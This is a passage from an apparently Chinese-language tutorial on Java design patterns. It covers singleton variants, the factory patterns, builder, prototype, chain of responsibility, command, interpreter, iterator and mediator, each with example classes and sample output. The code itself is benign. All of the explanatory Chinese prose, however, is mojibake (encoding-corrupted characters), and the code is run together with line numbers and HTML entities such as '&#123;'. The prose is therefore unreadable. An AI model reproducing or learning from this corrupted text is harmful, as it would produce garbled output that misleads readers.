è€ƒè™‘ä¸‹é¢çš„å®ç°ï¼Œä¹Ÿå°±æ˜¯åªä½¿ç”¨äº†ä¸€ä¸ª if è¯­å¥ã€‚åœ¨ uniqueInstance == null çš„æƒ…å†µä¸‹ï¼Œå¦‚æœä¸¤ä¸ªçº¿ç¨‹åŒæ—¶æ‰§è¡Œ if è¯­å¥ï¼Œé‚£ä¹ˆä¸¤ä¸ªçº¿ç¨‹å°±ä¼šåŒæ—¶è¿›å…¥ if è¯­å¥å—å†…ã€‚è™½ç„¶åœ¨ if è¯­å¥å—å†…æœ‰åŠ é”æ“ä½œï¼Œä½†æ˜¯ä¸¤ä¸ªçº¿ç¨‹éƒ½ä¼šæ‰§è¡Œ uniqueInstance = new Singleton(); è¿™æ¡è¯­å¥ï¼Œåªæ˜¯å…ˆåçš„é—®é¢˜ï¼Œä¹Ÿå°±æ˜¯è¯´ä¼šè¿›è¡Œä¸¤æ¬¡å®ä¾‹åŒ–ï¼Œä»è€Œäº§ç”Ÿäº†ä¸¤ä¸ªå®ä¾‹ã€‚å› æ­¤å¿…é¡»ä½¿ç”¨åŒé‡æ ¡éªŒé”ï¼Œä¹Ÿå°±æ˜¯éœ€è¦ä½¿ç”¨ä¸¤ä¸ª if è¯­å¥ã€‚ 12345if (uniqueInstance == null) &#123; synchronized (Singleton.class) &#123; uniqueInstance = new Singleton(); &#125;&#125; uniqueInstance é‡‡ç”¨ volatile å…³é”®å­—ä¿®é¥°ä¹Ÿæ˜¯å¾ˆæœ‰å¿…è¦çš„ã€‚uniqueInstance = new Singleton(); è¿™æ®µä»£ç å…¶å®æ˜¯åˆ†ä¸ºä¸‰æ­¥æ‰§è¡Œã€‚ åˆ†é…å†…å­˜ç©ºé—´ åˆå§‹åŒ–å¯¹è±¡ å°† uniqueInstance æŒ‡å‘åˆ†é…çš„å†…å­˜åœ°å€ ä½†æ˜¯ç”±äº JVM å…·æœ‰æŒ‡ä»¤é‡æ’çš„ç‰¹æ€§ï¼Œæœ‰å¯èƒ½æ‰§è¡Œé¡ºåºå˜ä¸ºäº† 1&gt;3&gt;2ï¼Œè¿™åœ¨å•çº¿ç¨‹æƒ…å†µä¸‹è‡ªç„¶æ˜¯æ²¡æœ‰é—®é¢˜ã€‚ä½†å¦‚æœæ˜¯å¤šçº¿ç¨‹ä¸‹ï¼Œæœ‰å¯èƒ½è·å¾—æ˜¯ä¸€ä¸ªè¿˜æ²¡æœ‰è¢«åˆå§‹åŒ–çš„å®ä¾‹ï¼Œä»¥è‡´äºç¨‹åºå‡ºé”™ã€‚ ä½¿ç”¨ volatile å¯ä»¥ç¦æ­¢ JVM çš„æŒ‡ä»¤é‡æ’ï¼Œä¿è¯åœ¨å¤šçº¿ç¨‹ç¯å¢ƒä¸‹ä¹Ÿèƒ½æ­£å¸¸è¿è¡Œã€‚ ï¼ˆäº”ï¼‰æšä¸¾å®ç° è¿™æ˜¯å•ä¾‹æ¨¡å¼çš„æœ€ä½³å®è·µï¼Œå®ƒå®ç°ç®€å•ï¼Œå¹¶ä¸”åœ¨é¢å¯¹å¤æ‚çš„åºåˆ—åŒ–æˆ–è€…åå°„æ”»å‡»çš„æ—¶å€™ï¼Œèƒ½å¤Ÿé˜²æ­¢å®ä¾‹åŒ–å¤šæ¬¡ã€‚ 123public enum Singleton &#123; uniqueInstance;&#125; è€ƒè™‘ä»¥ä¸‹å•ä¾‹æ¨¡å¼çš„å®ç°ï¼Œè¯¥ Singleton åœ¨æ¯æ¬¡åºåˆ—åŒ–çš„æ—¶å€™éƒ½ä¼šåˆ›å»ºä¸€ä¸ªæ–°çš„å®ä¾‹ï¼Œä¸ºäº†ä¿è¯åªåˆ›å»ºä¸€ä¸ªå®ä¾‹ï¼Œå¿…é¡»å£°æ˜æ‰€æœ‰å­—æ®µéƒ½æ˜¯ transientï¼Œå¹¶ä¸”æä¾›ä¸€ä¸ª readResolve() æ–¹æ³•ã€‚ 1234567891011121314public class Singleton implements Serializable &#123; private static Singleton uniqueInstance; private Singleton() &#123; &#125; public static synchronized Singleton getUniqueInstance() &#123; if (uniqueInstance == null) &#123; uniqueInstance = new Singleton(); &#125; return uniqueInstance; &#125;&#125; å¦‚æœä¸ä½¿ç”¨æšä¸¾æ¥å®ç°å•ä¾‹æ¨¡å¼ï¼Œä¼šå‡ºç°åå°„æ”»å‡»ï¼Œå› ä¸ºé€šè¿‡ setAccessible() æ–¹æ³•å¯ä»¥å°†ç§æœ‰æ„é€ å‡½æ•°çš„è®¿é—®çº§åˆ«è®¾ç½®ä¸º publicï¼Œç„¶åè°ƒç”¨æ„é€ å‡½æ•°ä»è€Œå®ä¾‹åŒ–å¯¹è±¡ã€‚å¦‚æœè¦é˜²æ­¢è¿™ç§æ”»å‡»ï¼Œéœ€è¦åœ¨æ„é€ å‡½æ•°ä¸­æ·»åŠ é˜²æ­¢å®ä¾‹åŒ–ç¬¬äºŒä¸ªå¯¹è±¡çš„ä»£ç ã€‚ ä»ä¸Šé¢çš„è®¨è®ºå¯ä»¥çœ‹å‡ºï¼Œè§£å†³åºåˆ—åŒ–å’Œåå°„æ”»å‡»å¾ˆéº»çƒ¦ï¼Œè€Œæšä¸¾å®ç°ä¸ä¼šå‡ºç°è¿™ä¸¤ç§é—®é¢˜ï¼Œæ‰€ä»¥è¯´æšä¸¾å®ç°å•ä¾‹æ¨¡å¼æ˜¯æœ€ä½³å®è·µã€‚ ä½¿ç”¨åœºæ™¯ Logger Classes Configuration Classes Accesing resources in shared mode Factories implemented as Singletons JDK java.lang.Runtime#getRuntime() java.awt.Desktop#getDesktop() java.lang.System#getSecurityManager() 2. ç®€å•å·¥å‚ï¼ˆSimple Factoryï¼‰æ„å›¾åœ¨åˆ›å»ºä¸€ä¸ªå¯¹è±¡æ—¶ä¸å‘å®¢æˆ·æš´éœ²å†…éƒ¨ç»†èŠ‚ï¼Œå¹¶æä¾›ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„é€šç”¨æ¥å£ã€‚ ç±»å›¾ç®€å•å·¥å‚ä¸æ˜¯è®¾è®¡æ¨¡å¼ï¼Œæ›´åƒæ˜¯ä¸€ç§ç¼–ç¨‹ä¹ æƒ¯ã€‚å®ƒæŠŠå®ä¾‹åŒ–çš„æ“ä½œå•ç‹¬æ”¾åˆ°ä¸€ä¸ªç±»ä¸­ï¼Œè¿™ä¸ªç±»å°±æˆä¸ºç®€å•å·¥å‚ç±»ï¼Œè®©ç®€å•å·¥å‚ç±»æ¥å†³å®šåº”è¯¥ç”¨å“ªä¸ªå…·ä½“å­ç±»æ¥å®ä¾‹åŒ–ã€‚ è¿™æ ·åšèƒ½æŠŠå®¢æˆ·ç±»å’Œå…·ä½“å­ç±»çš„å®ç°è§£è€¦ï¼Œå®¢æˆ·ç±»ä¸å†éœ€è¦çŸ¥é“æœ‰å“ªäº›å­ç±»ä»¥åŠåº”å½“å®ä¾‹åŒ–å“ªä¸ªå­ç±»ã€‚å› ä¸ºå®¢æˆ·ç±»å¾€å¾€æœ‰å¤šä¸ªï¼Œå¦‚æœä¸ä½¿ç”¨ç®€å•å·¥å‚ï¼Œæ‰€æœ‰çš„å®¢æˆ·ç±»éƒ½è¦çŸ¥é“æ‰€æœ‰å­ç±»çš„ç»†èŠ‚ã€‚è€Œä¸”ä¸€æ—¦å­ç±»å‘ç”Ÿæ”¹å˜ï¼Œä¾‹å¦‚å¢åŠ å­ç±»ï¼Œé‚£ä¹ˆæ‰€æœ‰çš„å®¢æˆ·ç±»éƒ½è¦è¿›è¡Œä¿®æ”¹ã€‚ å¦‚æœå­˜åœ¨ä¸‹é¢è¿™ç§ä»£ç ï¼Œå°±éœ€è¦ä½¿ç”¨ç®€å•å·¥å‚å°†å¯¹è±¡å®ä¾‹åŒ–çš„éƒ¨åˆ†æ”¾åˆ°ç®€å•å·¥å‚ä¸­ã€‚ 12345678910111213public class Client &#123; public static void main(String[] args) &#123; int type = 1; Product product; if (type == 1) &#123; product = new ConcreteProduct1(); &#125; else if (type == 2) &#123; product = new ConcreteProduct2(); &#125; else &#123; product = new ConcreteProduct(); &#125; &#125;&#125; å®ç°12public interface Product &#123;&#125; 12public class ConcreteProduct implements Product &#123;&#125; 12public class ConcreteProduct1 implements Product &#123;&#125; 12public class ConcreteProduct2 implements Product &#123;&#125; 12345678910public class SimpleFactory &#123; public Product createProduct(int type) &#123; if (type == 1) &#123; return new ConcreteProduct1(); &#125; else if (type == 2) &#123; return new ConcreteProduct2(); &#125; return new ConcreteProduct(); &#125;&#125; 123456public class Client &#123; public static void main(String[] args) &#123; SimpleFactory simpleFactory = new SimpleFactory(); Product product = simpleFactory.createProduct(1); &#125;&#125; 3. å·¥å‚æ–¹æ³•ï¼ˆFactory Methodï¼‰æ„å›¾å®šä¹‰äº†ä¸€ä¸ªåˆ›å»ºå¯¹è±¡çš„æ¥å£ï¼Œä½†ç”±å­ç±»å†³å®šè¦å®ä¾‹åŒ–å“ªä¸ªç±»ã€‚å·¥å‚æ–¹æ³•æŠŠå®ä¾‹åŒ–æ¨è¿Ÿåˆ°å­ç±»ã€‚ ç±»å›¾åœ¨ç®€å•å·¥å‚ä¸­ï¼Œåˆ›å»ºå¯¹è±¡çš„æ˜¯å¦ä¸€ä¸ªç±»ï¼Œè€Œåœ¨å·¥å‚æ–¹æ³•ä¸­ï¼Œæ˜¯ç”±å­ç±»æ¥åˆ›å»ºå¯¹è±¡ã€‚ ä¸‹å›¾ä¸­ï¼ŒFactory æœ‰ä¸€ä¸ª doSomething() æ–¹æ³•ï¼Œè¿™ä¸ªæ–¹æ³•éœ€è¦ç”¨åˆ°ä¸€ä¸ªäº§å“å¯¹è±¡ï¼Œè¿™ä¸ªäº§å“å¯¹è±¡ç”± factoryMethod() æ–¹æ³•åˆ›å»ºã€‚è¯¥æ–¹æ³•æ˜¯æŠ½è±¡çš„ï¼Œéœ€è¦ç”±å­ç±»å»å®ç°ã€‚ å®ç°1234567public abstract class Factory &#123; abstract public Product factoryMethod(); public void doSomething() &#123; Product product = factoryMethod(); // do something with the product &#125;&#125; 12345public class ConcreteFactory extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct(); &#125;&#125; 12345public class ConcreteFactory1 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct1(); &#125;&#125; 12345public class ConcreteFactory2 extends Factory &#123; public Product factoryMethod() &#123; return new ConcreteProduct2(); &#125;&#125; JDK java.util.Calendar java.util.ResourceBundle java.text.NumberFormat java.nio.charset.Charset java.net.URLStreamHandlerFactory java.util.EnumSet javax.xml.bind.JAXBContext 4. æŠ½è±¡å·¥å‚ï¼ˆAbstract Factoryï¼‰æ„å›¾æä¾›ä¸€ä¸ªæ¥å£ï¼Œç”¨äºåˆ›å»º ç›¸å…³çš„å¯¹è±¡å®¶æ— ã€‚ ç±»å›¾æŠ½è±¡å·¥å‚æ¨¡å¼åˆ›å»ºçš„æ˜¯å¯¹è±¡å®¶æ—ï¼Œä¹Ÿå°±æ˜¯å¾ˆå¤šå¯¹è±¡è€Œä¸æ˜¯ä¸€ä¸ªå¯¹è±¡ï¼Œå¹¶ä¸”è¿™äº›å¯¹è±¡æ˜¯ç›¸å…³çš„ï¼Œä¹Ÿå°±æ˜¯è¯´å¿…é¡»ä¸€èµ·åˆ›å»ºå‡ºæ¥ã€‚è€Œå·¥å‚æ–¹æ³•æ¨¡å¼åªæ˜¯ç”¨äºåˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™å’ŒæŠ½è±¡å·¥å‚æ¨¡å¼æœ‰å¾ˆå¤§ä¸åŒã€‚ æŠ½è±¡å·¥å‚æ¨¡å¼ç”¨åˆ°äº†å·¥å‚æ–¹æ³•æ¨¡å¼æ¥åˆ›å»ºå•ä¸€å¯¹è±¡ï¼ŒAbstractFactory ä¸­çš„ createProductA() å’Œ createProductB() æ–¹æ³•éƒ½æ˜¯è®©å­ç±»æ¥å®ç°ï¼Œè¿™ä¸¤ä¸ªæ–¹æ³•å•ç‹¬æ¥çœ‹å°±æ˜¯åœ¨åˆ›å»ºä¸€ä¸ªå¯¹è±¡ï¼Œè¿™ç¬¦åˆå·¥å‚æ–¹æ³•æ¨¡å¼çš„å®šä¹‰ã€‚ è‡³äºåˆ›å»ºå¯¹è±¡çš„å®¶æ—è¿™ä¸€æ¦‚å¿µæ˜¯åœ¨ Client ä½“ç°ï¼ŒClient è¦é€šè¿‡ AbstractFactory åŒæ—¶è°ƒç”¨ä¸¤ä¸ªæ–¹æ³•æ¥åˆ›å»ºå‡ºä¸¤ä¸ªå¯¹è±¡ï¼Œåœ¨è¿™é‡Œè¿™ä¸¤ä¸ªå¯¹è±¡å°±æœ‰å¾ˆå¤§çš„ç›¸å…³æ€§ï¼ŒClient éœ€è¦åŒæ—¶åˆ›å»ºå‡ºè¿™ä¸¤ä¸ªå¯¹è±¡ã€‚ ä»é«˜å±‚æ¬¡æ¥çœ‹ï¼ŒæŠ½è±¡å·¥å‚ä½¿ç”¨äº†ç»„åˆï¼Œå³ Cilent ç»„åˆäº† AbstractFactoryï¼Œè€Œå·¥å‚æ–¹æ³•æ¨¡å¼ä½¿ç”¨äº†ç»§æ‰¿ã€‚ ä»£ç å®ç°12public class AbstractProductA &#123;&#125; 12public class AbstractProductB &#123;&#125; 12public class ProductA1 extends AbstractProductA &#123;&#125; 12public class ProductA2 extends AbstractProductA &#123;&#125; 12public class ProductB1 extends AbstractProductB &#123;&#125; 12public class ProductB2 extends AbstractProductB &#123;&#125; 1234public abstract class AbstractFactory &#123; abstract AbstractProductA createProductA(); abstract AbstractProductB createProductB();&#125; 123456789public class ConcreteFactory1 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA1(); &#125; AbstractProductB createProductB() &#123; return new ProductB1(); &#125;&#125; 123456789public class ConcreteFactory2 extends AbstractFactory &#123; AbstractProductA createProductA() &#123; return new ProductA2(); &#125; AbstractProductB createProductB() &#123; return new ProductB2(); &#125;&#125; 12345678public class Client &#123; public static void main(String[] args) &#123; AbstractFactory abstractFactory = new ConcreteFactory1(); AbstractProductA productA = abstractFactory.createProductA(); AbstractProductB productB = abstractFactory.createProductB(); // do something with productA and productB &#125;&#125; JDK javax.xml.parsers.DocumentBuilderFactory javax.xml.transform.TransformerFactory javax.xml.xpath.XPathFactory 5. ç”Ÿæˆå™¨ï¼ˆBuilderï¼‰æ„å›¾å°è£…ä¸€ä¸ªå¯¹è±¡çš„æ„é€ è¿‡ç¨‹ï¼Œå¹¶å…è®¸æŒ‰æ­¥éª¤æ„é€ ã€‚ ç±»å›¾ å®ç°ä»¥ä¸‹æ˜¯ä¸€ä¸ªç®€æ˜“çš„ StringBuilder å®ç°ï¼Œå‚è€ƒäº† JDK 1.8 æºç ã€‚ 12345678910111213141516171819202122232425262728293031323334public class AbstractStringBuilder &#123; protected char[] value; protected int count; public AbstractStringBuilder(int capacity) &#123; count = 0; value = new char[capacity]; &#125; public AbstractStringBuilder append(char c) &#123; ensureCapacityInternal(count + 1); value[count++] = c; return this; &#125; private void ensureCapacityInternal(int minimumCapacity) &#123; // overflow-conscious code if (minimumCapacity - value.length &gt; 0) expandCapacity(minimumCapacity); &#125; void expandCapacity(int minimumCapacity) &#123; int newCapacity = value.length * 2 + 2; if (newCapacity - minimumCapacity &lt; 0) newCapacity = minimumCapacity; if (newCapacity &lt; 0) &#123; if (minimumCapacity &lt; 0) // overflow throw new OutOfMemoryError(); newCapacity = Integer.MAX_VALUE; &#125; value = Arrays.copyOf(value, newCapacity); &#125;&#125; 1234567891011public class StringBuilder extends AbstractStringBuilder &#123; public StringBuilder() &#123; super(16); &#125; @Override public String toString() &#123; // Create a copy, don't share the array return new String(value, 0, count); &#125;&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; StringBuilder sb = new StringBuilder(); final int count = 26; for (int i = 0; i &lt; count; i++) &#123; sb.append((char) ('a' + i)); &#125; System.out.println(sb.toString()); &#125;&#125; 1abcdefghijklmnopqrstuvwxyz JDK java.lang.StringBuilder java.nio.ByteBuffer java.lang.StringBuffer java.lang.Appendable Apache Camel builders 6. åŸå‹æ¨¡å¼ï¼ˆPrototypeï¼‰æ„å›¾ä½¿ç”¨åŸå‹å®ä¾‹æŒ‡å®šè¦åˆ›å»ºå¯¹è±¡çš„ç±»å‹ï¼Œé€šè¿‡å¤åˆ¶è¿™ä¸ªåŸå‹æ¥åˆ›å»ºæ–°å¯¹è±¡ã€‚ ç±»å›¾ å®ç°123public abstract class Prototype &#123; abstract Prototype myClone();&#125; 123456789101112131415161718public class ConcretePrototype extends Prototype &#123; private String filed; public ConcretePrototype(String filed) &#123; this.filed = filed; &#125; @Override Prototype myClone() &#123; return new ConcretePrototype(filed); &#125; @Override public String toString() &#123; return filed; &#125;&#125; 1234567public class Client &#123; public static void main(String[] args) &#123; Prototype prototype = new ConcretePrototype("abc"); Prototype clone = prototype.myClone(); System.out.println(clone.toString()); &#125;&#125; 1abc JDK java.lang.Object#clone() ä¸‰ã€è¡Œä¸ºå‹1. è´£ä»»é“¾ï¼ˆChain Of Responsibilityï¼‰æ„å›¾ä½¿å¤šä¸ªå¯¹è±¡éƒ½æœ‰æœºä¼šå¤„ç†è¯·æ±‚ï¼Œä»è€Œé¿å…è¯·æ±‚çš„å‘é€è€…å’Œæ¥æ”¶è€…ä¹‹é—´çš„è€¦åˆå…³ç³»ã€‚å°†è¿™äº›å¯¹è±¡è¿æˆä¸€æ¡é“¾ï¼Œå¹¶æ²¿ç€è¿™æ¡é“¾å‘é€è¯¥è¯·æ±‚ï¼Œç›´åˆ°æœ‰ä¸€ä¸ªå¯¹è±¡å¤„ç†å®ƒä¸ºæ­¢ã€‚ ç±»å›¾ Handlerï¼šå®šä¹‰å¤„ç†è¯·æ±‚çš„æ¥å£ï¼Œå¹¶ä¸”å®ç°åç»§é“¾ï¼ˆsuccessorï¼‰ å®ç°123456789public abstract class Handler &#123; protected Handler successor; public Handler(Handler successor) &#123; this.successor = successor; &#125; protected abstract void handleRequest(Request request);&#125; 12345678910111213141516public class ConcreteHandler1 extends Handler &#123; public ConcreteHandler1(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.type1) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler1"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 12345678910111213141516public class ConcreteHandler2 extends Handler&#123; public ConcreteHandler2(Handler successor) &#123; super(successor); &#125; @Override protected void handleRequest(Request request) &#123; if (request.getType() == RequestType.type2) &#123; System.out.println(request.getName() + " is handle by ConcreteHandler2"); return; &#125; if (successor != null) &#123; successor.handleRequest(request); &#125; &#125;&#125; 1234567891011121314151617public class Request &#123; private RequestType type; private String name; public Request(RequestType type, String name) &#123; this.type = type; this.name = name; &#125; public RequestType getType() &#123; return type; &#125; public String getName() &#123; return name; &#125;&#125; 123public enum RequestType &#123; type1, type2&#125; 12345678910public class Client &#123; public static void main(String[] args) &#123; Handler handler1 = new ConcreteHandler1(null); Handler handler2 = new ConcreteHandler2(handler1); Request request1 = new Request(RequestType.type1, "request1"); handler2.handleRequest(request1); Request request2 = new Request(RequestType.type2, "request2"); handler2.handleRequest(request2); &#125;&#125; 12request1 is handle by ConcreteHandler1request2 is handle by ConcreteHandler2 JDK java.util.logging.Logger#log() Apache Commons Chain javax.servlet.Filter#doFilter() 2. å‘½ä»¤ï¼ˆCommandï¼‰æ„å›¾å°†å‘½ä»¤å°è£…æˆå¯¹è±¡ä¸­ï¼Œä»¥ä¾¿ä½¿ç”¨å‘½ä»¤æ¥å‚æ•°åŒ–å…¶å®ƒå¯¹è±¡ï¼Œæˆ–è€…å°†å‘½ä»¤å¯¹è±¡æ”¾å…¥é˜Ÿåˆ—ä¸­è¿›è¡Œæ’é˜Ÿï¼Œæˆ–è€…å°†å‘½ä»¤å¯¹è±¡çš„æ“ä½œè®°å½•åˆ°æ—¥å¿—ä¸­ï¼Œä»¥åŠæ”¯æŒå¯æ’¤é”€çš„æ“ä½œã€‚ ç±»å›¾ Commandï¼šå‘½ä»¤ Receiverï¼šå‘½ä»¤æ¥æ”¶è€…ï¼Œä¹Ÿå°±æ˜¯å‘½ä»¤çœŸæ­£çš„æ‰§è¡Œè€… Invokerï¼šé€šè¿‡å®ƒæ¥è°ƒç”¨å‘½ä»¤ Clientï¼šå¯ä»¥è®¾ç½®å‘½ä»¤ä¸å‘½ä»¤çš„æ¥æ”¶è€… å®ç°è®¾è®¡ä¸€ä¸ªé¥æ§å™¨ï¼Œå¯ä»¥æ§åˆ¶ç”µç¯å¼€å…³ã€‚ 123public interface Command &#123; void execute();&#125; 123456789101112public class LightOnCommand implements Command &#123; Light light; public LightOnCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.on(); &#125;&#125; 123456789101112public class LightOffCommand implements Command &#123; Light light; public LightOffCommand(Light light) &#123; this.light = light; &#125; @Override public void execute() &#123; light.off(); &#125;&#125; 12345678910public class Light &#123; public void on() &#123; System.out.println("Light is on!"); &#125; public void off() &#123; System.out.println("Light is off!"); &#125;&#125; 1234567891011121314151617181920212223242526272829/** * é¥æ§å™¨ */public class Invoker &#123; private Command[] onCommands; private Command[] offCommands; private final int slotNum = 7; public Invoker() &#123; this.onCommands = new Command[slotNum]; this.offCommands = new Command[slotNum]; &#125; public void setOnCommand(Command command, int slot) &#123; onCommands[slot] = command; &#125; public void setOffCommand(Command command, int slot) &#123; offCommands[slot] = command; &#125; public void onButtonWasPushed(int slot) &#123; onCommands[slot].execute(); &#125; public void offButtonWasPushed(int slot) &#123; offCommands[slot].execute(); &#125;&#125; 123456789101112public class Client &#123; public static void main(String[] args) &#123; Invoker invoker = new Invoker(); Light light = new Light(); Command lightOnCommand = new LightOnCommand(light); Command lightOffCommand = new LightOffCommand(light); invoker.setOnCommand(lightOnCommand, 0); invoker.setOffCommand(lightOffCommand, 0); invoker.onButtonWasPushed(0); invoker.offButtonWasPushed(0); &#125;&#125; JDK java.lang.Runnable Netflix Hystrix javax.swing.Action 3. è§£é‡Šå™¨ï¼ˆInterpreterï¼‰æ„å›¾ä¸ºè¯­è¨€åˆ›å»ºè§£é‡Šå™¨ï¼Œé€šå¸¸ç”±è¯­è¨€çš„è¯­æ³•å’Œè¯­æ³•åˆ†ææ¥å®šä¹‰ã€‚ ç±»å›¾ TerminalExpressionï¼šç»ˆç»“ç¬¦è¡¨è¾¾å¼ï¼Œæ¯ä¸ªç»ˆç»“ç¬¦éƒ½éœ€è¦ä¸€ä¸ª TerminalExpression Contextï¼šä¸Šä¸‹æ–‡ï¼ŒåŒ…å«è§£é‡Šå™¨ä¹‹å¤–çš„ä¸€äº›å…¨å±€ä¿¡æ¯ å®ç°ä»¥ä¸‹æ˜¯ä¸€ä¸ªè§„åˆ™æ£€éªŒå™¨å®ç°ï¼Œå…·æœ‰ and å’Œ or è§„åˆ™ï¼Œé€šè¿‡è§„åˆ™å¯ä»¥æ„å»ºä¸€é¢—è§£ææ ‘ï¼Œç”¨æ¥æ£€éªŒä¸€ä¸ªæ–‡æœ¬æ˜¯å¦æ»¡è¶³è§£ææ ‘å®šä¹‰çš„è§„åˆ™ã€‚ ä¾‹å¦‚ä¸€é¢—è§£ææ ‘ä¸º D And (A Or (B C))ï¼Œæ–‡æœ¬ â€œD Aâ€ æ»¡è¶³è¯¥è§£ææ ‘å®šä¹‰çš„è§„åˆ™ã€‚ è¿™é‡Œçš„ Context æŒ‡çš„æ˜¯ Stringã€‚ 123public abstract class Expression &#123; public abstract boolean interpret(String str);&#125; 12345678910111213141516171819public class TerminalExpression extends Expression &#123; private String literal = null; public TerminalExpression(String str) &#123; literal = str; &#125; public boolean interpret(String str) &#123; StringTokenizer st = new StringTokenizer(str); while (st.hasMoreTokens()) &#123; String test = st.nextToken(); if (test.equals(literal)) &#123; return true; &#125; &#125; return false; &#125;&#125; 1234567891011121314public class AndExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public AndExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) &amp;&amp; expression2.interpret(str); &#125;&#125; 12345678910111213public class OrExpression extends Expression &#123; private Expression expression1 = null; private Expression expression2 = null; public OrExpression(Expression expression1, Expression expression2) &#123; this.expression1 = expression1; this.expression2 = expression2; &#125; public boolean interpret(String str) &#123; return expression1.interpret(str) || expression2.interpret(str); &#125;&#125; 123456789101112131415161718192021222324252627public class Client &#123; /** * æ„å»ºè§£ææ ‘ */ public static Expression buildInterpreterTree() &#123; // Literal Expression terminal1 = new TerminalExpression("A"); Expression terminal2 = new TerminalExpression("B"); Expression terminal3 = new TerminalExpression("C"); Expression terminal4 = new TerminalExpression("D"); // B C Expression alternation1 = new OrExpression(terminal2, terminal3); // A Or (B C) Expression alternation2 = new OrExpression(terminal1, alternation1); // D And (A Or (B C)) return new AndExpression(terminal4, alternation2); &#125; public static void main(String[] args) &#123; Expression define = buildInterpreterTree(); String context1 = "D A"; String context2 = "A B"; System.out.println(define.interpret(context1)); System.out.println(define.interpret(context2)); &#125;&#125; 12truefalse JDK java.util.Pattern java.text.Normalizer All subclasses of java.text.Format javax.el.ELResolver 4. è¿­ä»£å™¨ï¼ˆIteratorï¼‰æ„å›¾æä¾›ä¸€ç§é¡ºåºè®¿é—®èšåˆå¯¹è±¡å…ƒç´ çš„æ–¹æ³•ï¼Œå¹¶ä¸”ä¸æš´éœ²èšåˆå¯¹è±¡çš„å†…éƒ¨è¡¨ç¤ºã€‚ ç±»å›¾ Aggregate æ˜¯èšåˆç±»ï¼Œå…¶ä¸­ createIterator() æ–¹æ³•å¯ä»¥äº§ç”Ÿä¸€ä¸ª Iteratorï¼› Iterator ä¸»è¦å®šä¹‰äº† hasNext() å’Œ next() æ–¹æ³•ã€‚ Client ç»„åˆäº† Aggregateï¼Œä¸ºäº†è¿­ä»£éå† Aggregateï¼Œä¹Ÿéœ€è¦ç»„åˆ Iteratorã€‚ å®ç°123public interface Aggregate &#123; Iterator createIterator();&#125; 12345678910111213141516public class ConcreteAggregate implements Aggregate &#123; private Integer[] items; public ConcreteAggregate() &#123; items = new Integer[10]; for (int i = 0; i &lt; items.length; i++) &#123; items[i] = i; &#125; &#125; @Override public Iterator createIterator() &#123; return new ConcreteIterator&lt;Integer&gt;(items); &#125;&#125; 12345public interface Iterator&lt;Item&gt; &#123; Item next(); boolean hasNext();&#125; 12345678910111213141516171819public class ConcreteIterator&lt;Item&gt; implements Iterator &#123; private Item[] items; private int position = 0; public ConcreteIterator(Item[] items) &#123; this.items = items; &#125; @Override public Object next() &#123; return items[position++]; &#125; @Override public boolean hasNext() &#123; return position &lt; items.length; &#125;&#125; 123456789public class Client &#123; public static void main(String[] args) &#123; Aggregate aggregate = new ConcreteAggregate(); Iterator&lt;Integer&gt; iterator = aggregate.createIterator(); while (iterator.hasNext()) &#123; System.out.println(iterator.next()); &#125; &#125;&#125; JDK java.util.Iterator java.util.Enumeration 5. ä¸­ä»‹è€…ï¼ˆMediatorï¼‰æ„å›¾é›†ä¸­ç›¸å…³å¯¹è±¡ä¹‹é—´å¤æ‚çš„æ²Ÿé€šå’Œæ§åˆ¶æ–¹å¼ã€‚ ç±»å›¾ Mediatorï¼šä¸­ä»‹è€…ï¼Œå®šä¹‰ä¸€ä¸ªæ¥å£ç”¨äºä¸å„åŒäº‹ï¼ˆColleagueï¼‰å¯¹è±¡é€šä¿¡ã€‚ Colleagueï¼šåŒäº‹ï¼Œç›¸å…³å¯¹è±¡ å®ç°Alarmï¼ˆé—¹é’Ÿï¼‰ã€CoffeePotï¼ˆå’–å•¡å£¶ï¼‰ã€Calendarï¼ˆæ—¥å†ï¼‰ã€Sprinklerï¼ˆå–·å¤´ï¼‰æ˜¯ä¸€ç»„ç›¸å…³çš„å¯¹è±¡ï¼Œåœ¨æŸä¸ªå¯¹è±¡çš„äº‹ä»¶äº§ç”Ÿæ—¶éœ€è¦å»æ“ä½œå…¶å®ƒå¯¹è±¡ï¼Œå½¢æˆäº†ä¸‹é¢è¿™ç§ä¾èµ–ç»“æ„ï¼š ä½¿ç”¨ä¸­ä»‹è€…æ¨¡å¼å¯ä»¥å°†å¤æ‚çš„ä¾èµ–ç»“æ„å˜æˆæ˜Ÿå½¢ç»“æ„ï¼š 123public abstract class Colleague &#123; public abstract void onEvent(Mediator mediator);&#125; 1234567891011public class Alarm extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("alarm"); &#125; public void doAlarm() &#123; System.out.println("doAlarm()"); &#125;&#125; 12345678910public class CoffeePot extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("coffeePot"); &#125; public void doCoffeePot() &#123; System.out.println("doCoffeePot()"); &#125;&#125; 12345678910public class Calender extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("calender"); &#125; public void doCalender() &#123; System.out.println("doCalender()"); &#125;&#125; 12345678910public class Sprinkler extends Colleague &#123; @Override public void onEvent(Mediator mediator) &#123; mediator.doEvent("sprinkler"); &#125; public void doSprinkler() &#123; System.out.println("doSprinkler()"); &#125;&#125; 123public abstract class Mediator &#123; public abstract void doEvent(String eventType);&#125; 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849public class ConcreteMediator extends Mediator &#123; private Alarm alarm; private CoffeePot coffeePot; private Calender calender; private Sprinkler sprinkler; public ConcreteMediator(Alarm alarm, CoffeePot coffeePot, Calender calender, Sprinkler sprinkler) &#123; this.alarm = alarm; this.coffeePot = coffeePot; this.calender = calender; this.sprinkler = sprinkler; &#125; @Override public void doEvent(String eventType) &#123; switch (eventType) &#123; case "alarm": 